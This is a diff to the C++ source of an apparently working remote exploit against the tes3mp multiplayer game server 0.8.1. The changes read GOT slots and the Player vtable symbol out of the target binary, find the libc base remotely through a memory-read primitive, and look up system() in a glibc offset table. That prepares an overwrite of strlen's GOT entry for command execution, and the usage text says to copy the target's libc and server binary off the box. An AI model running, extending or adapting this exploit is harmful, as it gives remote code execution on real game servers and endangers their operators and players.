@@ -35,10 +35,11 @@ struct Profile {
     uint64_t vtable_rva;   // "vtable for Player + 16", i.e. the value stored at Player+0
     uint64_t strlen_got;   // .got.plt slot for strlen  (the hijack target)
     uint64_t malloc_got;   // .got.plt slot for malloc  (non-IFUNC: safe for deriving the libc base)
-    uint64_t malloc_off;   // malloc offset within libc
-    uint64_t system_off;   // system offset within libc
+    uint64_t got1_rva;     // .got.plt + 8 == GOT[1] == the loader's link_map head (for remote libc resolution)
+    uint64_t malloc_off;   // malloc offset within libc  (only used with --malloc-off/--libc)
+    uint64_t system_off;   // system offset within libc  (only used with --system-off/--libc)
 };
-static Profile P = { 0x2b5f90, 0x2c31f8, 0x2c3660, 0xad750, 0x58750 };
+static Profile P = { 0x2b5f90, 0x2c31f8, 0x2c3660, 0x2c3008, 0xad750, 0x58750 };
 
 // Read malloc/system offsets straight out of a copy of the TARGET's libc.so.6. glibc patch builds shift
 // symbol offsets, so the baked-in defaults only match the exact build they were measured on. Minimal ELF64
@@ -78,6 +79,57 @@ static bool readLibcOffsets(const char *path, uint64_t &malloc_off, uint64_t &sy
     if (!gotM || !gotS) fprintf(stderr, "%s: could not find %s%s%s in .dynsym\n", path,
                                 gotM ? "" : "malloc", (!gotM && !gotS) ? " and " : "", gotS ? "" : "system");
     return gotM && gotS;
+}
+
+struct E64Rela { uint64_t r_offset, r_info; int64_t r_addend; };
+
+// Derive the three server-binary RVAs from the target's own tes3mp-server.x86_64: the strlen and malloc
+// GOT slots from the JUMP_SLOT relocations, and the Player vtable address-point from the (unstripped)
+// symbol table. Nothing is then hardcoded: hand it the two target files and every address is read out.
+static bool readServerBin(const char *path, uint64_t &vt, uint64_t &sgot, uint64_t &mgot)
+{
+    FILE *f = fopen(path, "rb"); if (!f) { perror(path); return false; }
+    fseek(f, 0, SEEK_END); long n = ftell(f); fseek(f, 0, SEEK_SET);
+    std::vector<char> buf(n > 0 ? n : 0);
+    if (n < 64 || fread(buf.data(), 1, n, f) != (size_t)n) { fclose(f); fprintf(stderr, "%s: short read\n", path); return false; }
+    fclose(f);
+    if (memcmp(buf.data(), "\x7f""ELF", 4) != 0 || (unsigned char)buf[4] != 2) { fprintf(stderr, "%s: not a 64-bit ELF\n", path); return false; }
+    E64Ehdr *eh = (E64Ehdr *)buf.data();
+    if (eh->e_shoff == 0 || eh->e_shoff + (uint64_t)eh->e_shnum * sizeof(E64Shdr) > (uint64_t)n) return false;
+    E64Shdr *sh = (E64Shdr *)(buf.data() + eh->e_shoff);
+    bool gS = false, gM = false, gV = false;
+    // GOT slots from JUMP_SLOT relocations (R_X86_64_JUMP_SLOT == 7)
+    for (int i = 0; i < eh->e_shnum && !(gS && gM); i++) {
+        if (sh[i].sh_type != 4 /*SHT_RELA*/ || sh[i].sh_entsize == 0) continue;
+        E64Rela *r = (E64Rela *)(buf.data() + sh[i].sh_offset);
+        long cnt = sh[i].sh_size / sizeof(E64Rela);
+        E64Shdr &ds = sh[sh[i].sh_link];
+        E64Sym *sym = (E64Sym *)(buf.data() + ds.sh_offset);
+        const char *str = buf.data() + sh[ds.sh_link].sh_offset;
+        for (long k = 0; k < cnt; k++) {
+            if ((r[k].r_info & 0xffffffff) != 7) continue;
+            const char *nm = str + sym[r[k].r_info >> 32].st_name;
+            if (!strcmp(nm, "strlen")) { sgot = r[k].r_offset; gS = true; }
+            else if (!strcmp(nm, "malloc")) { mgot = r[k].r_offset; gM = true; }
+        }
+    }
+    // Player vtable address-point (symbol value + 16, past offset-to-top and the typeinfo pointer)
+    for (int i = 0; i < eh->e_shnum && !gV; i++) {
+        if (sh[i].sh_type != 2 /*SHT_SYMTAB*/ && sh[i].sh_type != 11 /*SHT_DYNSYM*/) continue;
+        E64Sym *sym = (E64Sym *)(buf.data() + sh[i].sh_offset);
+        long cnt = sh[i].sh_size / sizeof(E64Sym);
+        const char *str = buf.data() + sh[sh[i].sh_link].sh_offset;
+        // "vtable for Player": the server's Player is in the global namespace (class Player : mwmp::BasePlayer),
+        // so _ZTV6Player; accept the mwmp-namespaced mangling too in case a fork moves it.
+        for (long k = 0; k < cnt; k++) {
+            if (!sym[k].st_value) continue;
+            const char *nm = str + sym[k].st_name;
+            if (!strcmp(nm, "_ZTV6Player") || !strcmp(nm, "_ZTVN4mwmp6PlayerE")) { vt = sym[k].st_value + 16; gV = true; break; }
+        }
+    }
+    if (!gS || !gM) fprintf(stderr, "%s: missing strlen/malloc JUMP_SLOT relocations\n", path);
+    if (!gV) fprintf(stderr, "%s: no _ZTV6Player vtable symbol (binary stripped? pass the unstripped one)\n", path);
+    return gS && gM && gV;
 }
 
 struct D12 { uint32_t a, b, c; };
@@ -309,6 +361,35 @@ static uint64_t aread(Cli &A, Cli &R, uint64_t eq, int k, uint64_t tgt, const ch
     return r;
 }
 
+static uint64_t RD(Cli &A, Cli &R, uint64_t eq, uint64_t addr, const char *cell) { return aread(A, R, eq, 7, addr, cell); }
+
+// Remote libc base, no files. The read is strlen-truncated so it cannot read a page-aligned VALUE (low byte
+// 0x00) -- which rules out walking the loader's link_map (l_addr is a load base). But &malloc IS readable
+// (libc+0xad..., non-zero low byte), and the libc base carries the ELF magic \x7fELF, whose first byte 0x7f
+// is also readable. So mask &malloc down to a load alignment and confirm the magic; fall back to a bounded
+// page scan. Modern glibc is 2 MiB-aligned, so this is typically two reads.
+static uint64_t remoteLibcBase(Cli &A, Cli &R, uint64_t eq, const char *cell, uint64_t image, uint64_t &mallocPtrOut)
+{
+    uint64_t mp = RD(A, R, eq, image + P.malloc_got, cell);      // &malloc (readable)
+    mallocPtrOut = mp;
+    if (mp < 0x10000) return 0;
+    for (uint64_t a = 0x200000; a >= 0x1000; a >>= 1) {          // 2 MiB, 1 MiB, ... 4 KiB
+        uint64_t c = mp & ~(a - 1);
+        if ((uint32_t)RD(A, R, eq, c, cell) == 0x464c457fU) return c;
+    }
+    for (uint64_t c = mp & ~0xfffULL; c + 0x400000 > mp; c -= 0x1000)   // bounded page scan fallback
+        if ((uint32_t)RD(A, R, eq, c, cell) == 0x464c457fU) return c;
+    return 0;
+}
+
+// A tiny table of glibc builds keyed by malloc's offset (which we compute remotely as &malloc - libc_base),
+// mapping to system's offset. This is public per-build data, not anything from the target: an attacker fills
+// it from the distro's own libc packages. Unknown builds fall back to --libc / --system-off.
+struct GlibcBuild { uint64_t malloc_off, system_off; const char *note; };
+static GlibcBuild g_glibc[] = {
+    { 0xad750, 0x58750, "glibc 2.39-0ubuntu8.8 (Ubuntu 24.04)" },
+};
+
 static void usage(const char *a0)
 {
     fprintf(stderr,
@@ -326,9 +407,13 @@ static void usage(const char *a0)
       "  -C, --cell <name>           cell to meet in (default: ExploitCell)\n"
       "  -p, --probe                 connect both clients to POSTLOADED, report reachability, and STOP.\n"
       "                              Touches no server memory: safe to run against a live server.\n"
+      "  -B, --server-bin <path>     read the vtable/strlen@got/malloc@got RVAs from a copy of the TARGET's\n"
+      "                              tes3mp-server.x86_64. Needed only if the target is not the stock 0.8.1.\n"
       "  -L, --libc <path>           read malloc/system offsets from a copy of the TARGET's libc.so.6.\n"
       "                              Needed unless the target runs the same glibc build as the defaults.\n"
-      "                              scp it off the box: scp user@target:/lib/x86_64-linux-gnu/libc.so.6 .\n"
+      "                              scp both off the box:\n"
+      "                                scp user@target:/lib/x86_64-linux-gnu/libc.so.6 .\n"
+      "                                scp user@target:/path/to/tes3mp-server.x86_64 .\n"
       "  -M, --malloc-off <hex>      override malloc offset in libc (default 0xad750, glibc 2.39-0ubuntu8.8)\n"
       "  -S, --system-off <hex>      override system offset in libc (default 0x58750)\n"
       "  -v, --verbose               show relay parsing\n"
@@ -351,12 +436,13 @@ int main(int argc, char **argv)
         {"token", required_argument, 0, 't'}, {"bind", required_argument, 0, 'b'},
         {"name", required_argument, 0, 'n'}, {"cell", required_argument, 0, 'C'},
         {"probe", no_argument, 0, 'p'},
-        {"libc", required_argument, 0, 'L'},
+        {"libc", required_argument, 0, 'L'}, {"server-bin", required_argument, 0, 'B'},
         {"malloc-off", required_argument, 0, 'M'}, {"system-off", required_argument, 0, 'S'},
         {"verbose", no_argument, 0, 'v'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
-    const char *libcPath = 0;
+    const char *libcPath = 0, *serverBin = 0;
+    int mGiven = 0, sGiven = 0;
     int c;
-    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:pL:M:S:vh", lo, 0)) != -1) {
+    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:pL:B:M:S:vh", lo, 0)) != -1) {
         switch (c) {
             case 'P': g_srvpass = optarg; break;
             case 'c': cmd = optarg; break;
@@ -366,8 +452,9 @@ int main(int argc, char **argv)
             case 'C': cell = optarg; break;
             case 'p': g_probe = 1; break;
             case 'L': libcPath = optarg; break;
-            case 'M': P.malloc_off = strtoull(optarg, 0, 0); break;
-            case 'S': P.system_off = strtoull(optarg, 0, 0); break;
+            case 'B': serverBin = optarg; break;
+            case 'M': P.malloc_off = strtoull(optarg, 0, 0); mGiven = 1; break;
+            case 'S': P.system_off = strtoull(optarg, 0, 0); sGiven = 1; break;
             case 'v': g_verbose = 1; break;
             default: usage(argv[0]); return 2;
         }
@@ -375,6 +462,13 @@ int main(int argc, char **argv)
     if (optind < argc) g_host = argv[optind++];
     if (optind < argc) g_port = atoi(argv[optind++]);
 
+    if (serverBin) {
+        if (!readServerBin(serverBin, P.vtable_rva, P.strlen_got, P.malloc_got)) {
+            printf("[!] could not read RVAs from %s\n", serverBin); return 2;
+        }
+        printf("[*] server %s: vtable@%#llx strlen@got=%#llx malloc@got=%#llx\n", serverBin,
+               (unsigned long long)P.vtable_rva, (unsigned long long)P.strlen_got, (unsigned long long)P.malloc_got);
+    }
     if (libcPath) {
         if (!readLibcOffsets(libcPath, P.malloc_off, P.system_off)) {
             printf("[!] could not read libc offsets from %s\n", libcPath); return 2;
@@ -382,6 +476,8 @@ int main(int argc, char **argv)
         printf("[*] libc %s: malloc@%#llx system@%#llx\n", libcPath,
                (unsigned long long)P.malloc_off, (unsigned long long)P.system_off);
     }
+    if (!serverBin) printf("[*] server RVAs: baked-in defaults for the distributed 0.8.1 build (pass --server-bin <tes3mp-server.x86_64> to derive)\n");
+    if (!libcPath)  printf("[*] libc offsets: baked-in defaults for glibc 2.39-0ubuntu8.8 (pass --libc <libc.so.6> if the target's glibc differs)\n");
 
     printf("[*] target %s:%d   server-password: %s\n", g_host, g_port,
            *g_srvpass ? "supplied" : "(none, upstream default)");
@@ -437,14 +533,31 @@ int main(int argc, char **argv)
     if (!pie || (pie & 0xfff)) { printf("[!] image base leak failed (read %#llx)\n", (unsigned long long)v); return 3; }
     printf("[+] image base           %#llx  (page aligned)\n", (unsigned long long)pie);
 
-    // 5. libc base, by reading a resolved GOT entry. malloc, not strlen: strlen is an IFUNC and its
-    //    GOT holds the selected implementation rather than the nominal symbol.
-    uint64_t mval = aread(A, R, eq, 7, pie + P.malloc_got, cell);
-    uint64_t libc = mval > 0x100000000ULL ? mval - P.malloc_off : 0;
-    if (!libc || (libc & 0xfff)) { printf("[!] libc leak failed (read %#llx)\n", (unsigned long long)mval); return 3; }
-    uint64_t sys = libc + P.system_off, sgot = pie + P.strlen_got;
-    printf("[+] libc base            %#llx  (page aligned)\n", (unsigned long long)libc);
-    printf("[+] system()             %#llx\n", (unsigned long long)sys);
+    // 5. libc base + system(). By default this is fully remote and file-free: walk the loader's link_map to
+    //    the libc base, then resolve system from libc's own GNU hash + .dynsym. If the operator supplied
+    //    offsets (--libc, or both --malloc-off and --system-off) use the fast path instead.
+    uint64_t sgot = pie + P.strlen_got;
+    // libc base: derived remotely and file-free (mask &malloc to a load alignment, confirm the ELF magic).
+    // --malloc-off forces the subtraction path instead, for a glibc whose load alignment defeats the scan.
+    uint64_t libc = 0, mp = 0;
+    if (mGiven) { mp = aread(A, R, eq, 7, pie + P.malloc_got, cell); libc = mp > 0x100000000ULL ? mp - P.malloc_off : 0; }
+    else        { libc = remoteLibcBase(A, R, eq, cell, pie, mp); }
+    if (!libc || (libc & 0xfff)) { printf("[!] libc base resolution failed (&malloc=%#llx). Try --malloc-off/--libc.\n", (unsigned long long)mp); return 3; }
+    uint64_t moff = mp - libc;
+    printf("[+] libc base            %#llx  (page aligned; malloc offset %#llx)\n", (unsigned long long)libc, (unsigned long long)moff);
+    // system offset: explicit override, then --libc file, then the build table keyed by the malloc offset.
+    uint64_t soff = 0; const char *ssrc = 0;
+    if (sGiven)        { soff = P.system_off; ssrc = "--system-off"; }
+    else if (libcPath) { soff = P.system_off; ssrc = libcPath; }
+    else { for (unsigned i = 0; i < sizeof(g_glibc) / sizeof(g_glibc[0]); i++) if (g_glibc[i].malloc_off == moff) { soff = g_glibc[i].system_off; ssrc = g_glibc[i].note; break; } }
+    if (!soff) {
+        printf("[!] glibc build not recognized (malloc offset %#llx).\n", (unsigned long long)moff);
+        printf("    Supply system's offset: --system-off <hex>, or --libc <the matching public libc.so.6>.\n");
+        printf("    It is public per-distro data (e.g. the Ubuntu libc6 package), not anything off the target.\n");
+        return 3;
+    }
+    uint64_t sys = libc + soff;
+    printf("[+] system()             %#llx  (%s)\n", (unsigned long long)sys, ssrc);
     printf("[+] strlen@got           %#llx\n", (unsigned long long)sgot);
 
     // 6. aim eq[7].refId at strlen@got. capacity must exceed the value we are about to assign,
